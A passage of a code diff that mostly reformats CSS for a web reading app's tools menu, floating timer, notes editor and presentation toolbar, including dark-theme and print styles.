+        58% {
+            opacity: 1;
+            scale: 1.045;
+            filter: blur(0);
+        }
+
+        78% {
+            opacity: 1;
+            scale: .985;
+        }
+
+        100% {
+            opacity: 1;
+            scale: 1;
+            filter: blur(0);
+        }
     }
 
     #asyncToolsMenu.is-visible button {
         animation: asyncMenuItemSpring .46s cubic-bezier(.65, 0, .35, 1) both;
     }
 
-    #asyncToolsMenu.is-visible button:nth-child(1) { animation-delay: 0ms; }
-    #asyncToolsMenu.is-visible button:nth-child(2) { animation-delay: 35ms; }
-    #asyncToolsMenu.is-visible button:nth-child(3) { animation-delay: 70ms; }
-    #asyncToolsMenu.is-visible button:nth-child(4) { animation-delay: 105ms; }
-    #asyncToolsMenu.is-visible button:nth-child(5) { animation-delay: 140ms; }
-    #asyncToolsMenu.is-visible button:nth-child(6) { animation-delay: 175ms; }
+    #asyncToolsMenu.is-visible button:nth-child(1) {
+        animation-delay: 0ms;
+    }
+
+    #asyncToolsMenu.is-visible button:nth-child(2) {
+        animation-delay: 35ms;
+    }
+
+    #asyncToolsMenu.is-visible button:nth-child(3) {
+        animation-delay: 70ms;
+    }
+
+    #asyncToolsMenu.is-visible button:nth-child(4) {
+        animation-delay: 105ms;
+    }
+
+    #asyncToolsMenu.is-visible button:nth-child(5) {
+        animation-delay: 140ms;
+    }
+
+    #asyncToolsMenu.is-visible button:nth-child(6) {
+        animation-delay: 175ms;
+    }
 
     @keyframes asyncMenuItemSpring {
-        0% { opacity: 0; transform: translateY(14px) scale(.96); filter: blur(3px); }
-        100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        0% {
+            opacity: 0;
+            transform: translateY(14px) scale(.96);
+            filter: blur(3px);
+        }
+
+        100% {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+            filter: blur(0);
+        }
     }
 
     /* Disable mobile long-press text callouts/selection on the article itself.
        Editable fields remain selectable and usable. */
     @media (pointer: coarse) {
-        main.main-content > .content-wrapper,
-        main.main-content > .content-wrapper *:not(input):not(textarea):not([contenteditable="true"]) {
+
+        main.main-content>.content-wrapper,
+        main.main-content>.content-wrapper *:not(input):not(textarea):not([contenteditable="true"]) {
             -webkit-touch-callout: none !important;
             -webkit-user-select: none !important;
             user-select: none !important;
             -webkit-tap-highlight-color: transparent;
         }
 
-        main.main-content > .content-wrapper input,
-        main.main-content > .content-wrapper textarea,
-        main.main-content > .content-wrapper [contenteditable="true"] {
+        main.main-content>.content-wrapper input,
+        main.main-content>.content-wrapper textarea,
+        main.main-content>.content-wrapper [contenteditable="true"] {
             -webkit-user-select: text !important;
             user-select: text !important;
         }
@@ -3659,6 +3770,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         order: 2 !important;
         margin: 0 0 0 auto !important;
     }
+
     .window-icon-controls .window-icon-btn,
     #readingToolsPanel .rt-window-actions .window-icon-btn {
         position: relative !important;
@@ -3672,18 +3784,19 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         min-height: 30px !important;
         padding: 0 !important;
         margin: 0 !important;
-        border: 1px solid rgba(255,255,255,.34) !important;
+        border: 1px solid rgba(255, 255, 255, .34) !important;
         border-radius: 10px !important;
-        background: rgba(255,255,255,.16) !important;
+        background: rgba(255, 255, 255, .16) !important;
         color: currentColor !important;
         font-size: 13px !important;
         line-height: 1 !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.28), 0 2px 8px rgba(15,23,42,.10) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .28), 0 2px 8px rgba(15, 23, 42, .10) !important;
         backdrop-filter: blur(13px) saturate(150%);
         -webkit-backdrop-filter: blur(13px) saturate(150%);
         cursor: pointer !important;
         transition: transform .18s ease, background .18s ease, box-shadow .18s ease !important;
     }
+
     .window-icon-controls .window-icon-btn i,
     #readingToolsPanel .rt-window-actions .window-icon-btn i {
         display: block !important;
@@ -3691,19 +3804,26 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         line-height: 1 !important;
         pointer-events: none !important;
     }
+
     .window-icon-btn.window-close,
     .window-icon-btn.window-minimize,
     .window-icon-btn.window-maximize {
-        background: rgba(255,255,255,.16) !important;
-        border-color: rgba(255,255,255,.34) !important;
+        background: rgba(255, 255, 255, .16) !important;
+        border-color: rgba(255, 255, 255, .34) !important;
         color: inherit !important;
     }
-    .window-icon-btn::after { content: none !important; display: none !important; }
+
+    .window-icon-btn::after {
+        content: none !important;
+        display: none !important;
+    }
+
     .window-icon-btn:hover {
         transform: translateY(-1px) !important;
-        background: rgba(255,255,255,.28) !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.4), 0 4px 11px rgba(15,23,42,.13) !important;
+        background: rgba(255, 255, 255, .28) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .4), 0 4px 11px rgba(15, 23, 42, .13) !important;
     }
+
     #asyncNotesPanel .aux-window-actions .window-icon-btn,
     #asyncSoundPanel .aux-window-actions .window-icon-btn,
     #asyncPresentationPanel .aux-window-actions .window-icon-btn,
@@ -3715,14 +3835,15 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         height: 29px !important;
         min-height: 29px !important;
         padding: 0 !important;
-        border: 1px solid rgba(255,255,255,.38) !important;
+        border: 1px solid rgba(255, 255, 255, .38) !important;
         border-radius: 10px !important;
-        background: rgba(255,255,255,.17) !important;
+        background: rgba(255, 255, 255, .17) !important;
         color: #fff !important;
         font-size: 13px !important;
         line-height: 1 !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.32), 0 3px 9px rgba(15,23,42,.10) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .32), 0 3px 9px rgba(15, 23, 42, .10) !important;
     }
+
     #asyncFloatingTimer .window-icon-controls .window-icon-btn {
         flex-basis: 25px !important;
         width: 25px !important;
@@ -3731,6 +3852,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         min-height: 25px !important;
         border-radius: 8px !important;
     }
+
     #asyncNotesPanel .aux-window-actions .window-icon-btn i,
     #asyncSoundPanel .aux-window-actions .window-icon-btn i,
     #asyncPresentationPanel .aux-window-actions .window-icon-btn i,
@@ -3740,18 +3862,34 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         font-size: 13px !important;
         line-height: 1 !important;
     }
+
     #asyncNotesPanel .aux-window-actions .window-icon-btn::after,
     #asyncSoundPanel .aux-window-actions .window-icon-btn::after,
-    #asyncPresentationPanel .aux-window-actions .window-icon-btn::after { content: none !important; display: none !important; }
+    #asyncPresentationPanel .aux-window-actions .window-icon-btn::after {
+        content: none !important;
+        display: none !important;
+    }
+
     .tool-window-header,
     #asyncTimerDrag {
         display: flex !important;
         align-items: center !important;
         min-width: 0 !important;
     }
-    .tool-window-header > strong { flex: 0 1 auto !important; min-width: 0; }
-    .tool-window-header > .aux-drag-hint { margin-left: auto !important; }
-    #readingToolsPanel .rt-window-actions { order: 2 !important; margin-left: auto !important; }
+
+    .tool-window-header>strong {
+        flex: 0 1 auto !important;
+        min-width: 0;
+    }
+
+    .tool-window-header>.aux-drag-hint {
+        margin-left: auto !important;
+    }
+
+    #readingToolsPanel .rt-window-actions {
+        order: 2 !important;
+        margin-left: auto !important;
+    }
 
     /* Timer display scales to its own resized window instead of the viewport. */
     #asyncFloatingTimer {
@@ -3760,13 +3898,15 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         max-width: calc(100vw - 12px) !important;
         box-sizing: border-box !important;
     }
+
     #asyncTimerDrag {
         gap: 5px !important;
         width: 100%;
         min-width: 0 !important;
         overflow: hidden;
     }
-    #asyncTimerDrag > strong {
+
+    #asyncTimerDrag>strong {
         flex: 1 1 auto !important;
         min-width: 0 !important;
         max-width: 94px;
@@ -3775,16 +3915,19 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         text-overflow: ellipsis;
         font-size: 11px !important;
     }
+
     #aftTickToggle {
         flex: 0 0 27px !important;
         width: 27px !important;
         min-width: 27px !important;
         margin: 0 !important;
     }
+
     #asyncFloatingTimer .window-icon-controls {
         flex: 0 0 auto !important;
         gap: 3px !important;
     }
+
     #asyncFloatingTimer .window-icon-controls .window-icon-btn {
         flex-basis: 25px !important;
         width: 25px !important;
@@ -3793,6 +3936,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         min-height: 25px !important;
         border-radius: 8px !important;
     }
+
     #asyncFloatingTimer .aft-display {
         display: block;
         width: 100%;
@@ -3807,49 +3951,65 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         letter-spacing: .025em;
         line-height: 1.18;
     }
+
     #aftStatus {
         max-width: 100%;
         overflow-wrap: anywhere;
         white-space: normal;
     }
+
     #asyncFloatingTimer .aft-inputs,
-    #asyncFloatingTimer .aft-actions { min-width: 0; }
-    #asyncFloatingTimer .aft-inputs label { flex: 1 1 60px; min-width: 0; }
+    #asyncFloatingTimer .aft-actions {
+        min-width: 0;
+    }
+
+    #asyncFloatingTimer .aft-inputs label {
+        flex: 1 1 60px;
+        min-width: 0;
+    }
+
     #asyncFloatingTimer .aft-inputs input,
-    #asyncFloatingTimer .aft-actions button { min-width: 0; max-width: 100%; box-sizing: border-box; }
+    #asyncFloatingTimer .aft-actions button {
+        min-width: 0;
+        max-width: 100%;
+        box-sizing: border-box;
+    }
 
     /* Notes use a neutral theme-aware surface; the Quill toolbar stays above text. */
     #asyncNotesPanel {
         --notes-surface: #ffffff;
         --notes-editor-text: #1f2937;
-        --notes-toolbar-surface: rgba(59,130,246,.075);
-        --notes-panel-surface: rgba(255,255,255,.94);
+        --notes-toolbar-surface: rgba(59, 130, 246, .075);
+        --notes-panel-surface: rgba(255, 255, 255, .94);
         --notes-panel-text: #172033;
-        --notes-border: rgba(100,116,139,.25);
+        --notes-border: rgba(100, 116, 139, .25);
         background: var(--notes-panel-surface) !important;
         color: var(--notes-panel-text) !important;
         border-color: var(--notes-border) !important;
         overflow: visible !important;
     }
+
     html[data-theme="dark"] #asyncNotesPanel {
         --notes-surface: #111827;
         --notes-editor-text: #e5e7eb;
-        --notes-toolbar-surface: rgba(59,130,246,.13);
-        --notes-panel-surface: rgba(17,24,39,.96);
+        --notes-toolbar-surface: rgba(59, 130, 246, .13);
+        --notes-panel-surface: rgba(17, 24, 39, .96);
         --notes-panel-text: #e5e7eb;
-        --notes-border: rgba(148,163,184,.28);
+        --notes-border: rgba(148, 163, 184, .28);
         background: var(--notes-panel-surface) !important;
         color: var(--notes-panel-text) !important;
         border-color: var(--notes-border) !important;
     }
+
     #asyncNotesPanel .aux-head {
         position: relative !important;
         z-index: 30 !important;
         flex: 0 0 auto !important;
-        background: linear-gradient(112deg, rgba(59,130,246,.88), rgba(37,99,235,.74)) !important;
-        border-color: rgba(255,255,255,.38) !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.36), 0 5px 16px rgba(37,99,235,.13) !important;
+        background: linear-gradient(112deg, rgba(59, 130, 246, .88), rgba(37, 99, 235, .74)) !important;
+        border-color: rgba(255, 255, 255, .38) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .36), 0 5px 16px rgba(37, 99, 235, .13) !important;
     }
+
     #asyncNotesPanel .notes-toolbar,
     #asyncNotesPanel .ql-toolbar.ql-snow {
         position: relative !important;
@@ -3858,7 +4018,11 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         background: var(--notes-toolbar-surface) !important;
         border-color: var(--notes-border) !important;
     }
-    #asyncNotesPanel .ql-picker-options { z-index: 100150 !important; }
+
+    #asyncNotesPanel .ql-picker-options {
+        z-index: 100150 !important;
+    }
+
     #asyncNotesPanel #asyncNoteTitle {
         position: relative !important;
         z-index: 5 !important;
@@ -3867,6 +4031,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         color: var(--notes-editor-text) !important;
         border-color: var(--notes-border) !important;
     }
+
     #asyncNotesPanel #asyncQuillEditor {
         position: relative !important;
         z-index: 1 !important;
@@ -3876,6 +4041,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         background: var(--notes-surface) !important;
         color: var(--notes-editor-text) !important;
     }
+
     #asyncNotesPanel .ql-container.ql-snow,
     #asyncNotesPanel .ql-editor {
         position: relative !important;
@@ -3884,11 +4050,28 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         color: var(--notes-editor-text) !important;
         border-color: var(--notes-border) !important;
     }
-    #asyncNotesPanel .ql-editor { caret-color: var(--notes-editor-text) !important; }
-    #asyncNotesPanel .ql-editor.ql-blank::before { color: var(--notes-editor-text) !important; opacity: .58 !important; }
-    #asyncNotesPanel .ql-snow .ql-stroke { stroke: var(--notes-panel-text) !important; }
-    #asyncNotesPanel .ql-snow .ql-fill { fill: var(--notes-panel-text) !important; }
-    #asyncNotesPanel .ql-snow .ql-picker { color: var(--notes-panel-text) !important; }
+
+    #asyncNotesPanel .ql-editor {
+        caret-color: var(--notes-editor-text) !important;
+    }
+
+    #asyncNotesPanel .ql-editor.ql-blank::before {
+        color: var(--notes-editor-text) !important;
+        opacity: .58 !important;
+    }
+
+    #asyncNotesPanel .ql-snow .ql-stroke {
+        stroke: var(--notes-panel-text) !important;
+    }
+
+    #asyncNotesPanel .ql-snow .ql-fill {
+        fill: var(--notes-panel-text) !important;
+    }
+
+    #asyncNotesPanel .ql-snow .ql-picker {
+        color: var(--notes-panel-text) !important;
+    }
+
     /* Override the older higher-specificity teal rules for the dark theme too. */
     html[data-theme="dark"] #asyncNotesPanel #asyncQuillEditor,
     html[data-theme="dark"] #asyncNotesPanel .ql-container.ql-snow,
@@ -3897,23 +4080,36 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         color: var(--notes-editor-text) !important;
         border-color: var(--notes-border) !important;
     }
+
     html[data-theme="dark"] #asyncNotesPanel .ql-toolbar.ql-snow {
         background: var(--notes-toolbar-surface) !important;
         border-color: var(--notes-border) !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.10) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .10) !important;
     }
-    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-stroke { stroke: var(--notes-panel-text) !important; }
-    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-fill { fill: var(--notes-panel-text) !important; }
-    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker { color: var(--notes-panel-text) !important; }
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-stroke {
+        stroke: var(--notes-panel-text) !important;
+    }
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-fill {
+        fill: var(--notes-panel-text) !important;
+    }
+
+    html[data-theme="dark"] #asyncNotesPanel .ql-snow .ql-picker {
+        color: var(--notes-panel-text) !important;
+    }
+
     #asyncNotesPanel .notes-toolbar button:hover {
         color: #1d4ed8 !important;
-        background: rgba(59,130,246,.12) !important;
-        border-color: rgba(59,130,246,.34) !important;
+        background: rgba(59, 130, 246, .12) !important;
+        border-color: rgba(59, 130, 246, .34) !important;
     }
+
     html[data-theme="dark"] #asyncNotesPanel .notes-toolbar button:hover {
         color: #dbeafe !important;
-        background: rgba(59,130,246,.22) !important;
+        background: rgba(59, 130, 246, .22) !important;
     }
+
     #asyncNotesPanel .notes-footer {
         position: relative !important;
         z-index: 10 !important;
@@ -3922,6 +4118,7 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         border-color: var(--notes-border) !important;
         color: var(--notes-panel-text) !important;
     }
+
     html[data-theme="dark"] #asyncNotesPanel .notes-toolbar button,
     html[data-theme="dark"] #asyncNotesPanel #asyncNoteTitle {
         color: var(--notes-editor-text) !important;
@@ -3944,37 +4141,43 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         padding: 8px !important;
         gap: 0 !important;
         overflow: visible !important;
-        border: 1px solid rgba(96,165,250,.48) !important;
+        border: 1px solid rgba(96, 165, 250, .48) !important;
         border-radius: 20px !important;
-        background: linear-gradient(135deg, rgba(219,234,254,.88), rgba(147,197,253,.76)) !important;
+        background: linear-gradient(135deg, rgba(219, 234, 254, .88), rgba(147, 197, 253, .76)) !important;
         color: #1e3a8a !important;
-        box-shadow: 0 18px 48px rgba(37,99,235,.22), inset 0 1px 0 rgba(255,255,255,.72) !important;
+        box-shadow: 0 18px 48px rgba(37, 99, 235, .22), inset 0 1px 0 rgba(255, 255, 255, .72) !important;
         backdrop-filter: blur(26px) saturate(185%) !important;
         -webkit-backdrop-filter: blur(26px) saturate(185%) !important;
         transform: translate(-50%, calc(100% + 42px)) !important;
         opacity: 0 !important;
         visibility: hidden !important;
         pointer-events: none !important;
-        transition: transform .62s cubic-bezier(.16,1.24,.3,1), opacity .28s ease, visibility 0s linear .62s !important;
+        transition: transform .62s cubic-bezier(.16, 1.24, .3, 1), opacity .28s ease, visibility 0s linear .62s !important;
     }
+
     #asyncPresentationPanel.is-toolbar-visible {
         transform: translate(-50%, 0) !important;
         opacity: 1 !important;
         visibility: visible !important;
         pointer-events: auto !important;
-        transition: transform .62s cubic-bezier(.16,1.24,.3,1), opacity .28s ease, visibility 0s linear 0s !important;
+        transition: transform .62s cubic-bezier(.16, 1.24, .3, 1), opacity .28s ease, visibility 0s linear 0s !important;
     }
+
     html[data-theme="dark"] #asyncPresentationPanel {
-        border-color: rgba(147,197,253,.34) !important;
-        background: linear-gradient(135deg, rgba(30,64,175,.88), rgba(30,58,138,.84)) !important;
+        border-color: rgba(147, 197, 253, .34) !important;
+        background: linear-gradient(135deg, rgba(30, 64, 175, .88), rgba(30, 58, 138, .84)) !important;
         color: #eff6ff !important;
-        box-shadow: 0 18px 48px rgba(2,6,23,.42), inset 0 1px 0 rgba(191,219,254,.2) !important;
+        box-shadow: 0 18px 48px rgba(2, 6, 23, .42), inset 0 1px 0 rgba(191, 219, 254, .2) !important;
     }
-    #asyncPresentationPanel > .aux-head,
-    #asyncPresentationPanel > p,
-    #asyncPresentationPanel > .sound-volume,
-    #asyncPresentationPanel > #asyncPresentationStatus,
-    #asyncPresentationPanel > .async-tool-resize-handle { display: none !important; }
+
+    #asyncPresentationPanel>.aux-head,
+    #asyncPresentationPanel>p,
+    #asyncPresentationPanel>.sound-volume,
+    #asyncPresentationPanel>#asyncPresentationStatus,
+    #asyncPresentationPanel>.async-tool-resize-handle {
+        display: none !important;
+    }
+
     #asyncPresentationPanel .presentation-actions {
         display: flex !important;
         flex: 0 1 auto !important;
@@ -3991,7 +4194,11 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         overflow-y: hidden !important;
         scrollbar-width: none;
     }
-    #asyncPresentationPanel .presentation-actions::-webkit-scrollbar { display: none; }
+
+    #asyncPresentationPanel .presentation-actions::-webkit-scrollbar {
+        display: none;
+    }
+
     #asyncPresentationPanel .presentation-actions button {
         display: inline-flex !important;
         flex: 0 0 42px !important;
@@ -4002,174 +4209,379 @@ html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.act
         height: 42px !important;
         min-height: 42px !important;
         padding: 0 !important;
-        border: 1px solid rgba(59,130,246,.22) !important;
+        border: 1px solid rgba(59, 130, 246, .22) !important;
         border-radius: 13px !important;
-        background: rgba(255,255,255,.43) !important;
+        background: rgba(255, 255, 255, .43) !important;
         color: #1d4ed8 !important;
         font-size: 0 !important;
         line-height: 0 !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.68), 0 3px 10px rgba(30,64,175,.10) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .68), 0 3px 10px rgba(30, 64, 175, .10) !important;
         backdrop-filter: blur(12px) saturate(160%);
         -webkit-backdrop-filter: blur(12px) saturate(160%);
         cursor: pointer !important;
         transition: background .18s ease, border-color .18s ease, transform .18s ease !important;
     }
+
     #asyncPresentationPanel .presentation-actions button i {
         display: inline-block !important;
         font-size: 17px !important;
         line-height: 1 !important;
         pointer-events: none !important;
     }
+
     #asyncPresentationPanel .presentation-actions button:hover {
         transform: translateY(-2px) !important;
-        background: rgba(255,255,255,.72) !important;
+        background: rgba(255, 255, 255, .72) !important;
     }
+
     #asyncPresentationPanel .presentation-actions button.active {
-        background: rgba(37,99,235,.24) !important;
-        border-color: rgba(37,99,235,.66) !important;
+        background: rgba(37, 99, 235, .24) !important;
+        border-color: rgba(37, 99, 235, .66) !important;
         color: #1e40af !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.56), 0 0 0 2px rgba(59,130,246,.14) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .56), 0 0 0 2px rgba(59, 130, 246, .14) !important;
     }
+
     html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button {
-        border-color: rgba(191,219,254,.22) !important;
-        background: rgba(15,23,42,.34) !important;
+        border-color: rgba(191, 219, 254, .22) !important;
+        background: rgba(15, 23, 42, .34) !important;
         color: #dbeafe !important;
-        box-shadow: inset 0 1px 0 rgba(255,255,255,.13), 0 3px 10px rgba(2,6,23,.24) !important;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .13), 0 3px 10px rgba(2, 6, 23, .24) !important;
     }
+
     html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button:hover {
-        background: rgba(96,165,250,.26) !important;
+        background: rgba(96, 165, 250, .26) !important;
     }
+
     html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button:not(.window-icon-btn) {
-        background: rgba(15,23,42,.34) !important;
-        border-color: rgba(191,219,254,.22) !important;
+        background: rgba(15, 23, 42, .34) !important;
+        border-color: rgba(191, 219, 254, .22) !important;
         color: #dbeafe !important;
     }
+
     html[data-theme="dark"] #asyncPresentationPanel .presentation-actions button.active:not(.window-icon-btn) {
-        background: rgba(96,165,250,.34) !important;
-        border-color: rgba(147,197,253,.72) !important;
+        background: rgba(96, 165, 250, .34) !important;
+        border-color: rgba(147, 197, 253, .72) !important;
         color: #fff !important;
     }
+
     #asyncPresentationPanel.is-toolbar-visible .presentation-actions button {
-        animation: asyncPresentIconRise .48s cubic-bezier(.16,1.25,.3,1) both;
+        animation: asyncPresentIconRise .48s cubic-bezier(.16, 1.25, .3, 1) both;
     }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(1) { animation-delay: 0ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(2) { animation-delay: 25ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(3) { animation-delay: 50ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(4) { animation-delay: 75ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(5) { animation-delay: 100ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(6) { animation-delay: 125ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(7) { animation-delay: 150ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(8) { animation-delay: 175ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(9) { animation-delay: 200ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(10) { animation-delay: 225ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(11) { animation-delay: 250ms; }
-    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(12) { animation-delay: 275ms; }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(1) {
+        animation-delay: 0ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(2) {
+        animation-delay: 25ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(3) {
+        animation-delay: 50ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(4) {
+        animation-delay: 75ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(5) {
+        animation-delay: 100ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(6) {
+        animation-delay: 125ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(7) {
+        animation-delay: 150ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(8) {
+        animation-delay: 175ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(9) {
+        animation-delay: 200ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(10) {
+        animation-delay: 225ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(11) {
+        animation-delay: 250ms;
+    }
+
+    #asyncPresentationPanel.is-toolbar-visible .presentation-actions button:nth-child(12) {
+        animation-delay: 275ms;
+    }
+
     @keyframes asyncPresentIconRise {
-        0% { opacity: 0; transform: translateY(22px) scale(.72); filter: blur(4px); }
-        72% { opacity: 1; transform: translateY(-3px) scale(1.06); filter: blur(0); }
-        100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        0% {
+            opacity: 0;
+            transform: translateY(22px) scale(.72);
+            filter: blur(4px);
+        }
+
+        72% {
+            opacity: 1;
+            transform: translateY(-3px) scale(1.06);
+            filter: blur(0);
+        }
+
+        100% {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+            filter: blur(0);
+        }
     }
+
     #asyncPresentationCursor {
         background: #2563eb !important;
-        box-shadow: 0 0 0 5px rgba(37,99,235,.20), 0 0 18px rgba(37,99,235,.82) !important;
+        box-shadow: 0 0 0 5px rgba(37, 99, 235, .20), 0 0 18px rgba(37, 99, 235, .82) !important;
     }
+
     @media (max-width: 600px) {
-        #asyncPresentationPanel { bottom: 10px !important; padding: 6px !important; border-radius: 16px !important; }
-        #asyncPresentationPanel .presentation-actions { gap: 4px !important; max-width: calc(100vw - 32px) !important; }
-        #asyncPresentationPanel .presentation-actions button {
-            flex-basis: 37px !important; width: 37px !important; min-width: 37px !important;
-            height: 37px !important; min-height: 37px !important; border-radius: 11px !important;
+        #asyncPresentationPanel {
+            bottom: 10px !important;
+            padding: 6px !important;
+            border-radius: 16px !important;
         }
-        #asyncPresentationPanel .presentation-actions button i { font-size: 15px !important; }
+
+        #asyncPresentationPanel .presentation-actions {
+            gap: 4px !important;
+            max-width: calc(100vw - 32px) !important;
+        }
+
+        #asyncPresentationPanel .presentation-actions button {
+            flex-basis: 37px !important;
+            width: 37px !important;
+            min-width: 37px !important;
+            height: 37px !important;
+            min-height: 37px !important;
+            border-radius: 11px !important;
+        }
+
+        #asyncPresentationPanel .presentation-actions button i {
+            font-size: 15px !important;
+        }
     }
 
 
-/* v18 refinements */
-#asyncFloatingTimer .async-tool-resize-handle { display:none !important; }
-#asyncNotesPanel .aux-window-actions .window-minimize,
-#asyncNotesPanel .aux-window-actions .window-maximize,
-#asyncFloatingTimer .window-maximize,
-#asyncSoundPanel .window-maximize,
-#asyncPresentationPanel .window-maximize,
-#readingToolsPanel .window-maximize { display:none !important; }
-#asyncNotesPanel .aux-window-actions { margin-left:auto !important; }
-
-/* Two small glass dots at each corner; resize hit areas remain functional. */
-.async-tool-resize-handle[data-resize="ne"]::after,
-.async-tool-resize-handle[data-resize="nw"]::after,
-.async-tool-resize-handle[data-resize="se"]::after,
-.async-tool-resize-handle[data-resize="sw"]::after {
-    width:6px !important;height:6px !important;top:8px !important;left:8px !important;
-    border-radius:50% !important;
-    background:radial-gradient(circle at 25% 50%,rgba(255,255,255,.98) 0 1.5px,transparent 1.8px),
-               radial-gradient(circle at 75% 50%,rgba(147,197,253,.95) 0 1.5px,transparent 1.8px) !important;
-    box-shadow:0 1px 3px rgba(15,23,42,.22) !important;opacity:.72 !important;
-}
-.async-tool-resize-handle[data-resize="ne"]:hover::after,
-.async-tool-resize-handle[data-resize="nw"]:hover::after,
-.async-tool-resize-handle[data-resize="se"]:hover::after,
-.async-tool-resize-handle[data-resize="sw"]:hover::after { opacity:1 !important; }
-
-.presentation-settings-wrap { position:relative;display:flex;justify-content:flex-end; }
-.presentation-settings-toggle {
-    display:inline-flex;align-items:center;justify-content:center;width:38px;height:38px;padding:0;
-    border:1px solid var(--aux-border);border-radius:11px;
-    background:var(--aux-control);color:var(--aux-text);cursor:pointer;
-    backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
-}
-.presentation-settings {
-    position:absolute;right:0;bottom:calc(100% + 10px);width:min(270px,calc(100vw - 30px));
-    display:grid;gap:9px;margin:0;padding:11px;z-index:100150;
-    border:1px solid var(--aux-border);border-radius:12px;
-    background:var(--aux-glass,rgba(255,255,255,.9));
-    box-shadow:0 10px 28px rgba(15,23,42,.15);
-}
-.presentation-settings[hidden] { display:none !important; }
-.presentation-settings .sound-volume { display:flex;align-items:center;gap:9px; }
-.presentation-settings input[type="color"] { width:38px;height:30px;padding:2px;border:1px solid var(--aux-border);border-radius:7px;background:var(--aux-control); }
-
-@media print {
-    @page { margin:14mm; }
-    html,body { background:#fff !important;color:#111 !important; }
-    body * { visibility:hidden !important; }
-    main.main-content,
-    main.main-content > .content-wrapper,
-    main.main-content > .content-wrapper * { visibility:visible !important; }
-    .sidebar,#sidebar,.sidebar-container,.main-sidebar,aside.sidebar,
-    .topbar,#topbar,.top-bar,header.topbar,.navbar,
-    #asyncToolsDock,#readingToolsFab,#readingToolsPanel,#asyncNotesPanel,
-    #asyncSoundPanel,#asyncPresentationPanel,#asyncPresentationOverlay,
-    #asyncFloatingTimer,#aftAlarmOverlay,#readingToolsRoot { display:none !important;visibility:hidden !important; }
-    main.main-content {
